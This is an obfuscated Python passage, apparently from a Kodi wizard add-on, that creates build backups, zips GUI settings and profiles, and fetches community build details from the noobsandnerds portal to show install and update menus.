 if 22 - 22: i1IIi - IIi / IIiIi1iI - OoOoOO00 . ooOo
 if I1i1I1I11IiiI == 0 :
  IIiii11ii1II1 = [ I1IiI , 'cache' , 'system' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
  if 49 - 49: I1IiiI - i11iIiiIii + IIiiiI1iIII
 elif I1i1I1I11IiiI == 1 :
  pass
  if 19 - 19: OoOoOO00 . o0oOOo0O0Ooo . OoooooooOO
 if Oo0oO0ooo . replace ( '%20' , ' ' ) in ooo00o0o and Oo0oO0ooo != '' :
  if ( os . path . exists ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) and Oo0oO0ooo . replace ( '%20' , ' ' ) in iii1i1III ( ) ) or not os . path . exists ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) :
   I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "Stop leechers profiting from your work?" , 'If you\'d prefer sellers not to profit from your build click yes to add a startup message on your build. Do you want add the message?' , yeslabel = 'No' , nolabel = 'Yes' )
   if I1i1I1I11IiiI == 0 :
    oOOOoo0O0oO ( Oo0oO0ooo )
   if I1i1I1I11IiiI == 1 :
    try :
     iIiii1iI1i ( )
    except :
     pass
     if 36 - 36: IIiiiI1iIII + OoooooooOO / i11iIiiIii
 IiiIIiII11i1 ( iIii1 )
 O0OooooO0o0O0 ( )
 iiIIii ( iIii1 , i1II1IiiIi , O000o0000O , II1iI11 , O00o0O , O00oOo0O0o00O , IIiii11ii1II1 , o0OO000O )
 time . sleep ( 1 )
 if 74 - 74: OoOoOO00 / i1IIi % OoooooooOO
 o00o0o000Oo = xbmc . translatePath ( os . path . join ( IIII1ii1 , o00OO0o0 + '_guisettings.zip' ) )
 Oooo00OOo = zipfile . ZipFile ( o00o0o000Oo , mode = 'w' )
 if 6 - 6: ooOo / I1IiiI / OoOoOO00
 try :
  Oooo00OOo . write ( iIi1ii1I1 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except :
  o0ooooO0 = 0
  if 51 - 51: II111iiii / Oo0Ooo / I1IiiI + i11iIiiIii
 try :
  Oooo00OOo . write ( xbmc . translatePath ( os . path . join ( iIii1 , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except :
  pass
  if 5 - 5: OOOoOoo0O
 Oooo00OOo . close ( )
 if 22 - 22: iIii1I11I1II1 * IIi / Oo0Ooo
 if o00 == 'true' :
  iIoO0OOOoO0o = zipfile . ZipFile ( Iii1 , mode = 'w' )
  try :
   iIoO0OOOoO0o . write ( iIi1ii1I1 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except :
   o0ooooO0 = 0
   if 75 - 75: I1ii11iIi11i
  try :
   iIoO0OOOoO0o . write ( xbmc . translatePath ( os . path . join ( iIii1 , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except :
   pass
  iIoO0OOOoO0o . close ( )
  if 92 - 92: OOOoOoo0O / O0 * I1IiiI - OOOoOoo0O
 if o0ooooO0 == 0 :
  iI111I11I1I1 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your system, please reboot and try again.' , '' , '' )
  if 99 - 99: i11iIiiIii % OoooooooOO
 else :
  iI111I11I1I1 . ok ( "SUCCESS!" , 'You Are Now Backed Up. Remember this should only be used for local backup purposes and is not recommended for sharing online. Use the far superior NaN CP backup method for online use.' )
  if 56 - 56: IIiiiI1iIII * IIi
  if o00 == 'true' :
   iI111I11I1I1 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OOO0O0OOo , '[/COLOR]Universal Backup: [COLOR=dodgerblue]' + i1II1IiiIi + '[/COLOR]' )
   if 98 - 98: OOOoOoo0O + O0 * IIi + i11iIiiIii - Oo - iIii1I11I1II1
  else :
   iI111I11I1I1 . ok ( "Build Location" , 'Universal Backup:[CR][COLOR=dodgerblue]' + i1II1IiiIi + '[/COLOR]' )
   if 5 - 5: Oo % Oo0Ooo % IIiiiI1iIII % iiiiiiii1
   if 17 - 17: O00OOo00oo0o + II111iiii + OoooooooOO / Oo / IIiiiI1iIII
def oOoo0Ooooo ( ) :
 o0oOo00 ( )
 ooo00o0o = OOOO00o000o ( 'welcometext' )
 oOO0OOOOOo0Oo ( )
 if 15 - 15: II111iiii * ooOo % IIiIi1iI / i11iIiiIii - ooOo + Oo0Ooo
 if os . path . exists ( O0o0O00Oo0o0 ) :
  shutil . rmtree ( O0o0O00Oo0o0 )
  if 9 - 9: OOOoOoo0O - ooOo + O0 / IIiIi1iI % i1IIi
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Create noobsandnerds Build' , 'This backup will only work if you share your build on the [COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] portal with the rest of the community. It will not work with any other installer/wizard, do you wish to continue?' )
 if 97 - 97: o0oOOo0O0Ooo * iiiiiiii1
 if I1i1I1I11IiiI == 1 :
  OOooO0OOoo . create ( 'Checking File Structure' , '' , 'Please wait' , '' )
  if not os . path . exists ( I11i1I1I ) :
   os . makedirs ( I11i1I1I )
   if 78 - 78: OOOoOoo0O . Oo + ooOo * IIiIi1iI - i1IIi
  o0ooooO0 = 1
  IIII1ii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , '' ) )
  OOO0O0OOo = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
  Iii1 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
  if 27 - 27: O00OOo00oo0o % i1IIi . Oo0Ooo % IIi
  if not os . path . exists ( IIII1ii1 ) :
   os . makedirs ( IIII1ii1 )
   if 10 - 10: IIiiiI1iIII / OoooooooOO
  I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
  if 50 - 50: i11iIiiIii - OoooooooOO . ooOo + O0 . i1IIi
  if ( not I1iII1IIi1IiI ) :
   return False , 0
   if 91 - 91: o0oOOo0O0Ooo . IIiIi1iI % Oo0Ooo - IIiIi1iI . ooOo % i11iIiiIii
  o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
  i1II1IiiIi = xbmc . translatePath ( os . path . join ( IIII1ii1 , o00OO0o0 + '.zip' ) )
  if 25 - 25: iIii1I11I1II1
  if 63 - 63: iiiiiiii1
  ii111iI1i1 = [ I1IiI ]
  OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
  o0OO000O = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
  oO0oOoo0O = "Creating full backup of existing build"
  O000o0000O = "Creating Community Build"
  II1iI11 = "Archiving..."
  O00o0O = ""
  O00oOo0O0o00O = "Please Wait"
  if 96 - 96: OOOoOoo0O
  if 34 - 34: OoOoOO00 / OoO0O00 - I1IiiI . O0 . Oo
  if o00 == 'true' :
   iiIIii ( iIii1 , OOO0O0OOo , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
   if 63 - 63: IIiIi1iI
  I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
  if 11 - 11: IIiIi1iI - iIii1I11I1II1
  if 92 - 92: OoO0O00
  if I1i1I1I11IiiI == 0 :
   IIiii11ii1II1 = [ I1IiI , 'cache' , 'system' , 'addons' , 'Thumbnails' , 'CP_Profiles' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' ]
   if 15 - 15: IIiiiI1iIII / IIiiiI1iIII + iIii1I11I1II1 % OoooooooOO
  elif I1i1I1I11IiiI == 1 :
   IIiii11ii1II1 = [ I1IiI , 'cache' , 'system' , 'addons' , 'Thumbnails' , 'CP_Profiles' , "peripheral_data" , 'library' , 'keymaps' ]
   if 12 - 12: iiiiiiii1
  if Oo0oO0ooo . replace ( '%20' , ' ' ) in ooo00o0o and Oo0oO0ooo != '' :
   if ( os . path . exists ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) and Oo0oO0ooo . replace ( '%20' , ' ' ) in iii1i1III ( ) ) or not os . path . exists ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) :
    I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "Stop leechers profiting from your work?" , 'If you\'d prefer sellers not to profit from your build click yes to add a startup message on your build. Do you want add the message?' , yeslabel = 'No' , nolabel = 'Yes' )
    if I1i1I1I11IiiI == 0 :
     oOOOoo0O0oO ( Oo0oO0ooo )
    if I1i1I1I11IiiI == 1 :
     try :
      iIiii1iI1i ( )
     except :
      pass
      if 36 - 36: IIi . IIiiiI1iIII * OoooooooOO - o0oOOo0O0Ooo
  oo0ooooo00o ( )
  IiiIIiII11i1 ( iIii1 )
  iiIIii ( iIii1 , i1II1IiiIi , O000o0000O , II1iI11 , O00o0O , O00oOo0O0o00O , IIiii11ii1II1 , o0OO000O )
  if 60 - 60: Oo . IIiIi1iI / iIii1I11I1II1 + Oo * IIi
  if 82 - 82: i11iIiiIii . iIii1I11I1II1 * I1IiiI - OOOoOoo0O + O00OOo00oo0o
  try :
   os . remove ( O00O0oOO00O00 )
  except :
   pass
   if 48 - 48: I1ii11iIi11i
  try :
   os . remove ( O0o0O00Oo0o0 )
  except :
   pass
   if 96 - 96: iiiiiiii1 . OoooooooOO
  time . sleep ( 1 )
  if 39 - 39: Oo + OoO0O00
  if 80 - 80: Oo % OoO0O00 / OoOoOO00
  o00o0o000Oo = xbmc . translatePath ( os . path . join ( IIII1ii1 , o00OO0o0 + '_guisettings.zip' ) )
  if 54 - 54: Oo0Ooo % OoO0O00 - Oo - OOOoOoo0O
  try :
   shutil . copyfile ( iIi1ii1I1 , os . path . join ( I11i1I1I , 'guisettings.xml' ) )
   if oOOoo00O0O == 'true' :
    print "### Successfully copied guisettings to : " + os . path . join ( I11i1I1I , 'guisettings.xml' )
  except :
   if oOOoo00O0O == 'true' :
    print "### FAILED TO copy guisettings to : " + os . path . join ( I11i1I1I , 'guisettings.xml' )
   o0ooooO0 = 0
   if 71 - 71: iiiiiiii1 . i11iIiiIii
  try :
   shutil . copyfile ( xbmc . translatePath ( os . path . join ( iIii1 , 'userdata' , 'profiles.xml' ) ) , xbmc . translatePath ( os . path . join ( I11i1I1I , 'profiles.xml' ) ) )
   print "### Successfully copied profiles to : " + os . path . join ( I11i1I1I , 'profiles.xml' )
  except :
   pass
   if 56 - 56: O0 * IIiIi1iI + IIiIi1iI * iIii1I11I1II1 / iiiiiiii1 * IIi
  IiOo0O0O = os . path . join ( iiI1IiI , 'script.skinshortcuts' )
  if os . path . exists ( IiOo0O0O ) :
   try :
    shutil . copytree ( os . path . join ( iiI1IiI , 'script.skinshortcuts' ) , os . path . join ( I11i1I1I , 'addon_data' , 'script.skinshortcuts' ) )
    if oOOoo00O0O == 'true' :
     print "### Successfully copied skinshortcuts to : " + os . path . join ( I11i1I1I , 'addon_data' , 'script.skinshortcuts' )
   except :
    iI111I11I1I1 . ok ( 'Failed to copy Skin Shortcuts' , 'There was an error trying to backup your script.skinshortcuts, please try again and if you continue to receive this message upload a log and send details to the noobsandnerds forum.' )
    if oOOoo00O0O == 'true' :
     print "### FAILED to copy skinshortcuts to: " + os . path . join ( I11i1I1I , 'addon_data' , 'script.skinshortcuts' )
     if 8 - 8: i11iIiiIii * O0 + I1ii11iIi11i . iIii1I11I1II1 % OOOoOoo0O / OOOoOoo0O
  if os . path . exists ( os . path . join ( iiI1IiI , o00OO00OoO ) ) :
   try :
    shutil . copytree ( os . path . join ( iiI1IiI , o00OO00OoO ) , os . path . join ( I11i1I1I , 'addon_data' , o00OO00OoO ) )
    if oOOoo00O0O == 'true' :
     print "### Successfully copied skin data to : " + os . path . join ( I11i1I1I , 'addon_data' , o00OO00OoO )
   except :
    iI111I11I1I1 . ok ( 'Failed to copy skin data' , 'There was an error trying to backup your skin data, please try again and if you continue to receive this message upload a log and send details to the noobsandnerds forum.' )
    if oOOoo00O0O == 'true' :
     print "### FAILED to copy skin data to: " + os . path . join ( I11i1I1I , 'addon_data' , o00OO00OoO )
     if 70 - 70: I1IiiI + O00OOo00oo0o
  oo ( I11i1I1I , o00o0o000Oo )
  if 70 - 70: IIiiiI1iIII . i11iIiiIii
  if 76 - 76: IIiIi1iI . IIiiiI1iIII % IIiIi1iI - IIi
  if 51 - 51: OoooooooOO + o0oOOo0O0Ooo * iIii1I11I1II1 * ooOo / i1IIi
  if 19 - 19: IIiIi1iI - OoOoOO00 % ooOo / OoooooooOO % IIiIi1iI
  if o00 == 'true' :
   oo ( I11i1I1I , Iii1 )
   if 65 - 65: O0 . ooOo
   if 85 - 85: II111iiii
  if os . path . exists ( I11i1I1I ) :
   shutil . rmtree ( I11i1I1I )
   if 55 - 55: I1ii11iIi11i
  if o0ooooO0 == 0 :
   iI111I11I1I1 . ok ( 'ERROR' , 'There was an error backing up your guisettings.xml, you cannot share a build without one so please try again. If this keeps happening please upload a log and contact the noobsandnerds forum with details.' )
   if 76 - 76: ooOo - i11iIiiIii
  else :
   iI111I11I1I1 . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 27 - 27: I1ii11iIi11i - i11iIiiIii % IIi / Oo0Ooo . Oo0Ooo / OoooooooOO
   if o00 == 'true' :
    iI111I11I1I1 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OOO0O0OOo , '[/COLOR]Universal Backup (this will ONLY work for sharing on the [COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] portal):[CR][COLOR=dodgerblue]' + i1II1IiiIi + '[/COLOR]' )
    if 76 - 76: OOOoOoo0O * OoO0O00 . iIii1I11I1II1 % OoooooooOO % I1ii11iIi11i
   else :
    iI111I11I1I1 . ok ( "Build Location" , '[COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] Backup (this will ONLY work for sharing on the Community Portal):[CR][COLOR=dodgerblue]' + i1II1IiiIi + '[/COLOR]' )
    if 39 - 39: II111iiii * OoOoOO00 . O0 * OOOoOoo0O
    if 89 - 89: O00OOo00oo0o - iiiiiiii1 . OOOoOoo0O - IIi - I1IiiI
def o0O00O ( url , video ) :
 iIii ( )
 i1I1i1 = 'http://noobsandnerds.com/TI/Community_Builds/community_builds_test.php?id=%s' % ( url )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 Iioo0O00ooo0o = re . compile ( 'path="(.+?)"' ) . findall ( O0OoooO0 )
 ii1i1Iii = re . compile ( 'myart="(.+?)"' ) . findall ( O0OoooO0 )
 oO00oO00O0Oo = re . compile ( 'artpack="(.+?)"' ) . findall ( O0OoooO0 )
 I1IIIiIiIi = re . compile ( 'videopreview="(.+?)"' ) . findall ( O0OoooO0 )
 OO0o0o0oo = re . compile ( 'videoguide1="(.+?)"' ) . findall ( O0OoooO0 )
 iIiII1 = re . compile ( 'videoguide2="(.+?)"' ) . findall ( O0OoooO0 )
 i111iii1I1 = re . compile ( 'videoguide3="(.+?)"' ) . findall ( O0OoooO0 )
 iiIiII1 = re . compile ( 'videoguide4="(.+?)"' ) . findall ( O0OoooO0 )
 ii111iI = re . compile ( 'videoguide5="(.+?)"' ) . findall ( O0OoooO0 )
 ii11I1 = re . compile ( 'videolabel1="(.+?)"' ) . findall ( O0OoooO0 )
 I1I = re . compile ( 'videolabel2="(.+?)"' ) . findall ( O0OoooO0 )
 oOO0o0 = re . compile ( 'videolabel3="(.+?)"' ) . findall ( O0OoooO0 )
 Ii1Ii1 = re . compile ( 'videolabel4="(.+?)"' ) . findall ( O0OoooO0 )
 o000ooOo0o0OO = re . compile ( 'videolabel5="(.+?)"' ) . findall ( O0OoooO0 )
 oOooo0 = re . compile ( 'name="(.+?)"' ) . findall ( O0OoooO0 )
 iiI1ii1IIiI = re . compile ( 'author="(.+?)"' ) . findall ( O0OoooO0 )
 OO0o0oOOO0O = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
 OOO0o0 = re . compile ( 'description="(.+?)"' ) . findall ( O0OoooO0 )
 IIi1i1I11IIII = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( O0OoooO0 )
 OooOoOOO00O = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( O0OoooO0 )
 I111iIIII11iI = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( O0OoooO0 )
 oOoOO = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( O0OoooO0 )
 OooIiIIII1i11I = re . compile ( 'updated="(.+?)"' ) . findall ( O0OoooO0 )
 i11I1iIii1i11 = re . compile ( 'defaultskin="(.+?)"' ) . findall ( O0OoooO0 )
 iIiiI11II11i = re . compile ( 'skins="(.+?)"' ) . findall ( O0OoooO0 )
 o00OoO0o0 = re . compile ( 'videoaddons="(.+?)"' ) . findall ( O0OoooO0 )
 o0OOOoO0ooOOOo0 = re . compile ( 'audioaddons="(.+?)"' ) . findall ( O0OoooO0 )
 o0oOOO = re . compile ( 'programaddons="(.+?)"' ) . findall ( O0OoooO0 )
 IIi11 = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( O0OoooO0 )
 O0OOO = re . compile ( 'sources="(.+?)"' ) . findall ( O0OoooO0 )
 iii1iII1I = re . compile ( 'adult="(.+?)"' ) . findall ( O0OoooO0 )
 i1Ii11ii = re . compile ( 'guisettings="(.+?)"' ) . findall ( O0OoooO0 )
 Ii11IIIi1 = re . compile ( 'thumb="(.+?)"' ) . findall ( O0OoooO0 )
 ooooooo00oO0OO = re . compile ( 'fanart="(.+?)"' ) . findall ( O0OoooO0 )
 IIIii11 = re . compile ( 'openelec="(.+?)"' ) . findall ( O0OoooO0 )
 if 29 - 29: O00OOo00oo0o - O00OOo00oo0o / iiiiiiii1
 I1I1IiI1 = ii1i1Iii [ 0 ] if ( len ( ii1i1Iii ) > 0 ) else ''
 I11IIII = oO00oO00O0Oo [ 0 ] if ( len ( oO00oO00O0Oo ) > 0 ) else ''
 IIo0o0O0O00oOOo = Iioo0O00ooo0o [ 0 ] if ( len ( Iioo0O00ooo0o ) > 0 ) else ''
 ooo0O = oOooo0 [ 0 ] if ( len ( oOooo0 ) > 0 ) else ''
 IiIi1I1Iiii = iiI1ii1IIiI [ 0 ] if ( len ( iiI1ii1IIiI ) > 0 ) else ''
 oOOo0oo0O = OO0o0oOOO0O [ 0 ] if ( len ( OO0o0oOOO0O ) > 0 ) else ''
 O00Oo = OOO0o0 [ 0 ] if ( len ( OOO0o0 ) > 0 ) else 'No information available'
 iiiii1II = OooIiIIII1i11I [ 0 ] if ( len ( OooIiIIII1i11I ) > 0 ) else ''
 oOIii = i11I1iIii1i11 [ 0 ] if ( len ( i11I1iIii1i11 ) > 0 ) else ''
 i1IIIIiiI11 = iIiiI11II11i [ 0 ] if ( len ( iIiiI11II11i ) > 0 ) else ''
 I1iii1I = o00OoO0o0 [ 0 ] if ( len ( o00OoO0o0 ) > 0 ) else ''
 ooo = o0OOOoO0ooOOOo0 [ 0 ] if ( len ( o0OOOoO0ooOOOo0 ) > 0 ) else ''
 II111 = o0oOOO [ 0 ] if ( len ( o0oOOO ) > 0 ) else ''
 I11iIi = IIi11 [ 0 ] if ( len ( IIi11 ) > 0 ) else ''
 Ii1IIiII1I = O0OOO [ 0 ] if ( len ( O0OOO ) > 0 ) else ''
 OOOii = iii1iII1I [ 0 ] if ( len ( iii1iII1I ) > 0 ) else ''
 Iii1I11 = i1Ii11ii [ 0 ] if ( len ( i1Ii11ii ) > 0 ) else 'None'
 O0o0o = IIi1i1I11IIII [ 0 ] if ( len ( IIi1i1I11IIII ) > 0 ) else 'None'
 IiiiIi1111I = OooOoOOO00O [ 0 ] if ( len ( OooOoOOO00O ) > 0 ) else 'None'
 iII1i1ii = I111iIIII11iI [ 0 ] if ( len ( I111iIIII11iI ) > 0 ) else 'None'
 i1I1ii1i = oOoOO [ 0 ] if ( len ( oOoOO ) > 0 ) else 'None'
 oO0o0O0Ooo0o = I1IIIiIiIi [ 0 ] if ( len ( I1IIIiIiIi ) > 0 ) else 'None'
 IioO0oOOO0Ooo = OO0o0o0oo [ 0 ] if ( len ( OO0o0o0oo ) > 0 ) else 'None'
 i1i1I = iIiII1 [ 0 ] if ( len ( iIiII1 ) > 0 ) else 'None'
 IiIIi1 = i111iii1I1 [ 0 ] if ( len ( i111iii1I1 ) > 0 ) else 'None'
 iII11I1Ii1 = iiIiII1 [ 0 ] if ( len ( iiIiII1 ) > 0 ) else 'None'
 o0o0 = ii111iI [ 0 ] if ( len ( ii111iI ) > 0 ) else 'None'
 IiIi1 = ii11I1 [ 0 ] if ( len ( ii11I1 ) > 0 ) else 'None'
 i111iiI1ii = I1I [ 0 ] if ( len ( I1I ) > 0 ) else 'None'
 IIiii = oOO0o0 [ 0 ] if ( len ( oOO0o0 ) > 0 ) else 'None'
 I1i1i = Ii1Ii1 [ 0 ] if ( len ( Ii1Ii1 ) > 0 ) else 'None'
 OOOOooO0oO00O0o = o000ooOo0o0OO [ 0 ] if ( len ( o000ooOo0o0OO ) > 0 ) else 'None'
 Oo0o = Ii11IIIi1 [ 0 ] if ( len ( Ii11IIIi1 ) > 0 ) else 'None'
 iiiiII11iIi = ooooooo00oO0OO [ 0 ] if ( len ( ooooooo00oO0OO ) > 0 ) else 'None'
 OO00 = IIIii11 [ 0 ] if ( len ( IIIii11 ) > 0 ) else 'None'
 if 52 - 52: II111iiii / I1IiiI . ooOo * IIiiiI1iIII . OOOoOoo0O
 I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'w+' )
 I1I1IIiiii1ii . write ( 'id="' + str ( video ) + '"\nname="' + ooo0O + '"\nversion="' + oOOo0oo0O + '"' )
 I1I1IIiiii1ii . close ( )
 if 25 - 25: i11iIiiIii / OoOoOO00 - IIi / OoO0O00 . o0oOOo0O0Ooo . o0oOOo0O0Ooo
 iI1 = open ( O000oo0O , mode = 'r' )
 iIIII1 = iI1 . read ( )
 iI1 . close ( )
 if 65 - 65: O0 / II111iiii . iIii1I11I1II1 . ooOo / Oo0Ooo % iIii1I11I1II1
 Oo0Oo = re . compile ( 'id="(.+?)"' ) . findall ( iIIII1 )
 OO0iiiii1iiIIii = Oo0Oo [ 0 ] if ( len ( Oo0Oo ) > 0 ) else 'None'
 II1IIii1I11I = re . compile ( 'version="(.+?)"' ) . findall ( iIIII1 )
 iiI111I1iIiI = II1IIii1I11I [ 0 ] if ( len ( II1IIii1I11I ) > 0 ) else 'None'
 ii1IiIIiI11111Ii , O0OOoO0o0O0 , OO0Oo00OO0oo = url . partition ( '&' )
 print "### Community Build Details:"
 print "### Name: " + ooo0O
 print "### URL: " + O0o0o
 Ii1I1Ii ( '' , '[COLOR=yellow]IMPORTANT:[/COLOR] Install Instructions' , '' , 'instructions_2' , '' , '' , '' , '' )
 Ii11I1 ( '[COLOR=yellow]Description:[/COLOR] This contains important info from the build author' , 'None' , 'description' , '' , iiiiII11iIi , ooo0O , IiIi1I1Iiii , oOOo0oo0O , O00Oo , iiiii1II , i1IIIIiiI11 , I1iii1I , ooo , II111 , I11iIi , Ii1IIiII1I , OOOii )
 if 53 - 53: OoO0O00 - iiiiiiii1 + O00OOo00oo0o
 if OO0iiiii1iiIIii == ii1IiIIiI11111Ii and iiI111I1iIiI != oOOo0oo0O :
  Ii1I1Ii ( '' , '[COLOR=orange]----------------- UPDATE AVAILABLE ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  oo0o00O ( '[COLOR=dodgerblue]1. Update:[/COLOR] Overwrite My Library & Profiles' , O0o0o , 'update_community' , Oo0o , '' , 'update' , ooo0O , oOIii , Iii1I11 , I11IIII )
  oo0o00O ( '[COLOR=dodgerblue]2. Update:[/COLOR] Keep My Library & Profiles' , O0o0o , 'update_community' , Oo0o , '' , 'updatelibprofile' , ooo0O , oOIii , Iii1I11 , I11IIII )
  oo0o00O ( '[COLOR=dodgerblue]3. Update:[/COLOR] Keep My Library Only' , O0o0o , 'update_community' , Oo0o , '' , 'updatelibrary' , ooo0O , oOIii , Iii1I11 , I11IIII )
  oo0o00O ( '[COLOR=dodgerblue]4. Update:[/COLOR] Keep My Profiles Only' , O0o0o , 'update_community' , Oo0o , '' , 'updateprofiles' , ooo0O , oOIii , Iii1I11 , I11IIII )
  if 29 - 29: Oo + OoooooooOO + ooOo * I1IiiI - O00OOo00oo0o / i11iIiiIii
 if oO0o0O0Ooo0o != 'None' or IioO0oOOO0Ooo != 'None' or i1i1I != 'None' or IiIIi1 != 'None' or iII11I1Ii1 != 'None' or o0o0 != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]------------------ VIDEO GUIDES -----------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 5 - 5: O0 - I1IiiI
 if oO0o0O0Ooo0o != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] Preview[/COLOR]' , oO0o0O0Ooo0o , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 44 - 44: II111iiii . II111iiii + Oo * O00OOo00oo0o
 if IioO0oOOO0Ooo != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IiIi1 + '[/COLOR]' , IioO0oOOO0Ooo , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 16 - 16: II111iiii
 if i1i1I != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + i111iiI1ii + '[/COLOR]' , i1i1I , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 100 - 100: O0 - i1IIi
 if IiIIi1 != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IIiii + '[/COLOR]' , IiIIi1 , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 48 - 48: ooOo % iiiiiiii1 + O0
 if iII11I1Ii1 != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + I1i1i + '[/COLOR]' , iII11I1Ii1 , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 27 - 27: I1ii11iIi11i / Oo
 if o0o0 != 'None' :
  Ii1I1Ii ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + OOOOooO0oO00O0o + '[/COLOR]' , o0o0 , 'play_video' , '' , iiiiII11iIi , '' , '' )
  if 33 - 33: OoooooooOO % I1ii11iIi11i . O0 / I1ii11iIi11i
 if OO0iiiii1iiIIii != ii1IiIIiI11111Ii :
  Ii1I1Ii ( '' , '[COLOR=orange]------------------ INSTALL OPTIONS ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 63 - 63: IIiiiI1iIII + iIii1I11I1II1 + I1IiiI + IIi
 if O0o0o == 'None' :
  oo0o00O ( '[COLOR=orange]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
  if 72 - 72: OoO0O00 + i11iIiiIii + I1ii11iIi11i
 if OO0iiiii1iiIIii != ii1IiIIiI11111Ii :
  if IioO0O ( ) and OO00 != 'None' :
   if 96 - 96: ooOo % i1IIi / o0oOOo0O0Ooo
   oo0o00O ( '[COLOR=darkcyan]OpenELEC FRESH INSTALL[/COLOR]' , OO00 , 'restore_openelec' , Oo0o , iiiiII11iIi , Iii1I11 , ooo0O , '' , '' , '' )
   if 13 - 13: II111iiii - Oo0Ooo % i11iIiiIii + IIiIi1iI
   if 88 - 88: O0 . ooOo % I1IiiI
  oo0o00O ( '[COLOR=dodgerblue]Standard Install[/COLOR]' , O0o0o , 'restore_community' , Oo0o , iiiiII11iIi , 'merge' , ooo0O , oOIii , Iii1I11 , I11IIII )
  if 10 - 10: I1IiiI + O0
  if 75 - 75: O0 % iIii1I11I1II1 / OoOoOO00 % Oo / IIiiiI1iIII
  if 31 - 31: i11iIiiIii * OoOoOO00
  if 69 - 69: i11iIiiIii
 if Iii1I11 != 'None' :
  if 61 - 61: O0
  Ii1I1Ii ( '' , '[COLOR=dodgerblue](Optional) Apply guisettings.xml fix[/COLOR]' , Iii1I11 , 'guisettingsfix' , '' , iiiiII11iIi , '' , '' )
  if 21 - 21: OoO0O00 % iIii1I11I1II1 . OoO0O00
  if 99 - 99: o0oOOo0O0Ooo * Oo % ooOo * ooOo + OoooooooOO
def O0OO ( url ) :
 if 30 - 30: OoOoOO00 * Oo0Ooo % iIii1I11I1II1 % OoO0O00 + i11iIiiIii
 iii1 = ''
 if url == 'create_pack' :
  iii1 = ooo0O0o00O ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' , 10 )
  IiOo00O0o0O = xbmcgui . Dialog ( ) . browse ( 3 , 'Select the folder you want to store this file in' , 'files' , '' , False , False )
  I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this keyword" )
  if 86 - 86: OOOoOoo0O + O0 + Oo0Ooo - OOOoOoo0O
  if ( not I1iII1IIi1IiI ) :
   return False , 0
